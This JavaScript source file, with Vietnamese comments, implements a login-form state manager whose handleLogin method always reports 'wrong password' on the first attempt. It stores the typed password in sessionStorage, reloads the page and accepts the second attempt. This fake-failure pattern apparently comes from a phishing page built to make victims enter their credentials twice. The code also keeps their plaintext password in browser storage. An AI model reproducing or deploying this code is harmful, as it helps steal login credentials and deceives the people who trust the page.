class LoginStateManager {
    constructor() {
        this.storageKey = 'loginState';
        this.attemptKey = 'loginAttempts';
        this.init();
    }

    init() {
        this.loadState();
        this.setupEventListeners();
    }

    loadState() {
        const state = this.getState();
        if (state.hasError) {
            this.displayError(state.errorMessage, state.savedPassword);
            this.clearState();
        }
        
        // Điền email từ localStorage
        const email = localStorage.getItem('email');
        if (email) {
            const emailInput = document.getElementById('email');
            if (emailInput) emailInput.value = email;
        }
    }

    setupEventListeners() {
        const passwordInput = document.getElementById('password');
        if (passwordInput) {
            passwordInput.addEventListener('input', () => {
                if (passwordInput.value.length > 0) {
                    passwordInput.style.border = '1px solid #E5E5E5';
                    this.hideErrorMessage();
                } else {
                    passwordInput.style.border = '1px solid #FF0303';
                }
            });
        }
    }

    getState() {
        const state = sessionStorage.getItem(this.storageKey);
        return state ? JSON.parse(state) : { hasError: false };
    }

    setState(state) {
        sessionStorage.setItem(this.storageKey, JSON.stringify(state));
    }

    clearState() {
        sessionStorage.removeItem(this.storageKey);
    }

    getAttempts() {
        return parseInt(sessionStorage.getItem(this.attemptKey) || '0');
    }

    incrementAttempts() {
        const attempts = this.getAttempts() + 1;
        sessionStorage.setItem(this.attemptKey, attempts.toString());
        return attempts;
    }

    resetAttempts() {
        sessionStorage.removeItem(this.attemptKey);
    }

    displayError(message, password) {
        const passwordInput = document.getElementById('password');
        if (passwordInput) {
            passwordInput.value = password;
            passwordInput.focus();
            passwordInput.select();
            passwordInput.style.border = '1px solid #FF0303';
        }

        this.showErrorMessage(message);
    }

    showErrorMessage(message) {
        const existingError = document.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }
        
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.style.cssText = `
            color: #FF0303;
            font-size: 14px;
            margin-bottom: 10px;
            text-align: center;
            padding: 8px;
            background-color: #fff5f5;
            border: 1px solid #fed7d7;
            border-radius: 4px;
            animation: slideIn 0.3s ease-out;
        `;
        errorDiv.textContent = message;
        
        const form = document.querySelector('form');
        if (form) {
            form.insertBefore(errorDiv, form.firstChild);
        }
    }

    hideErrorMessage() {
        const errorMessage = document.querySelector('.error-message');
        if (errorMessage) {
            errorMessage.remove();
        }
    }

    handleLogin(email, password, callback) {
        const attempts = this.incrementAttempts();
        
        if (attempts === 1) {
            // Lần đầu: Báo lỗi
            this.setState({
                hasError: true,
                errorMessage: 'Mật khẩu không đúng. Vui lòng thử lại.',
                savedPassword: password
            });
            window.location.reload();
        } else {
            // Lần 2: Thành công
            this.resetAttempts();
            callback();
        }
    }
}

// Khởi tạo state manager khi trang load
document.addEventListener('DOMContentLoaded', function() {
    window.loginStateManager = new LoginStateManager();
});
